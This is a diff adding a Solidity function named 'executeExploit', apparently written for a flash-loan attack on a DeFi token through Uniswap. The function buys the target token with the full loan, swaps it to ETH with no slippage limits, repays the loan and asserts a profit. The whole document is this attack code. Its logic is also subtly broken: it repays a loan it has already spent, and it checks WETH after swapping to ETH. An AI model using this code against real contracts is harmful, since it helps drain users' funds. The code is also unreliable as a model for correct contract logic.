@@ -1,0 +1,58 @@
+```html
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Swap the valuableToken for MyCoinToken.
+    address myCoinToken = target;
+    uint256 tokenAmountToBuy = amount; // Use the entire flashloan amount
+
+    // Get the reserves and current balance
+    (uint112 reserve0, uint112 reserve1, ) = uniswapPair.getReserves();
+    console.log("Current reserves: %d, %d", reserve0, reserve1);
+
+    // Perform the swap using Uniswap
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Assume valuableToken is token0
+    path[1] = myCoinToken;
+
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        tokenAmountToBuy,
+        0, // Accept any amount of MyCoinToken
+        path,
+        address(this),
+        block.timestamp + 300
+    );
+
+    uint256 myCoinBalance = IERC20(myCoinToken).balanceOf(address(this));
+    console.log("Acquired MyCoinToken: %s", myCoinBalance);
+
+    // Now obtain WETH by exchanging MyCoinToken
+    address weth = uniswapRouter.WETH();
+    path[0] = myCoinToken;
+    path[1] = weth;
+
+    // Approve Uniswap to spend MyCoinToken
+    IERC20(myCoinToken).approve(address(uniswapRouter), myCoinBalance);
+
+    // Swap MyCoinToken for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        myCoinBalance,
+        0, // Accept any amount of eth
+        path,
+        address(this),
+        block.timestamp + 300
+    );
+
+    // Finalize the operations
+    uint256 currentWETHBalance = IERC20(weth).balanceOf(address(this));
+    console.log("Final WETH balance after exploit: %s", currentWETHBalance);
+
+    // Repay the flashloan
+    valuableToken.transfer(flashloanProvider, amount); // Repay the loan
+
+    // Assert the surplus in the balance
+    assert(currentWETHBalance > amount);
+
+    // End the function
+}
+</executeExploitCode>
+```
